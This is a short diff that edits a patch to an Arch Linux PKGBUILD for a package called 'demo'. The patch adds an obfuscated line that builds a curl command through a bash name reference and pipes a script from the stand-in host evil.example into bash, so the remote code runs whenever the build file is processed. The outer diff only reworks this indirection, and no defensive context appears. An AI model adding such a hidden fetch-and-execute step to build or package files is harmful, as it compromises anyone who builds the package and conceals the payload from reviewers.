@@ -1,7 +1,8 @@
 --- a/PKGBUILD
 +++ b/PKGBUILD
-@@ -1,2 +1,4 @@
+@@ -1,2 +1,5 @@
  pkgname=demo
  pkgver=1.0
-+declare -n R=curl
++declare -n R=C
++C=curl
 +$R https://evil.example/p.sh | bash
